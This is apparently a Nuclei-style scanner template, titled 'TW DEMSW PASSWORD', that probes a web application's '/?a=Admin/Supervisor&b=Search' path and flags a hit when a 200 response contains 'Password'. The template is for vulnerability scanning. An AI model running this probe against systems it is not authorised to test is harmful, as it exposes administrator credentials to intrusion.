id: TW-DEMSW_PASSWORD

info:
  name: TW DEMSW PASSWORD
  author: momika233
  severity: high
  description: TP5-Arbitrary-file-read
  reference:
    - https://github.com/momika233
  tags: TP5,Arbitrary_file-read

requests:
  - method: GET
    path:
      - '{{BaseURL}}/?a=Admin/Supervisor&b=Search'


    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "Password.*"
        part: body

      - type: status
        status:
          - 200
